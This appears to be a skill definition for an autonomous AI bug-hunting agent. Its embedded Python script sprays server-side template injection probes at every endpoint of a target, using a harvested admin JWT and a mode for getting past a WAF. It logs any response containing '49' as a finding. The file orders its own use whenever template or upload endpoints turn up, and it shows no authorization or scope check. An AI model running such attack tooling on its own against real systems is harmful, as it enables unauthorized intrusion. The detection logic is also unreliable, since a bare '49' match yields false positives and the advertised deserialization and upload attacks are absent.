---
name: attack-rce
description: RCE via SSTI, command injection, deserialization, file upload. MUST BE USED when upload or template endpoints found.
---
Read ~/new_agent/.claude/AGENT-SHARED.md
Read ~/new_agent/.claude/skills/hunt-rce/SKILL.md
Read ~/new_agent/.claude/skills/hunt-ssti/SKILL.md

TARGET=$(cat ~/new_agent/state/.active-target)

python3 << 'PYEOF'
import sys, json, time, os
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp
sh = SafeHttp(allow_raw_for_waf=True)

TARGET  = open('/home/hunter/new_agent/state/.active-target').read().strip()
tokens  = json.load(open(f'/home/hunter/new_agent/targets/{TARGET}/recon/tokens.json'))
QUEUE   = '/home/hunter/new_agent/state/queue.jsonl'
RESULTS = f'/home/hunter/new_agent/results/{TARGET}'
os.makedirs(RESULTS, exist_ok=True)

jwt = tokens.get('ADMIN', {}).get('jwt', '')
headers = {"Authorization": f"Bearer {jwt}"} if jwt else {}

SSTI_PAYLOADS = ['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','*{7*7}']

with open(f'/home/hunter/new_agent/targets/{TARGET}/recon/endpoints.txt') as f:
    for url in f:
        url = url.strip()
        if not url: continue
        for payload in SSTI_PAYLOADS:
            try:
                r = sh.request("GET", f"{url}?q={payload}", headers=headers)
                if '49' in r.text:
                    finding = {"event":"finding_found","type":"ssti","url":url,
                              "payload":payload,"response":r.text[:150]}
                    with open(f'{RESULTS}/attack-rce-ssti-{int(time.time())}.json','w') as out:
                        json.dump(finding, out, indent=2)
                    with open(QUEUE,'a') as q:
                        q.write(json.dumps({"event":"finding_found","type":"ssti","url":url})+'\n')
            except: pass
PYEOF
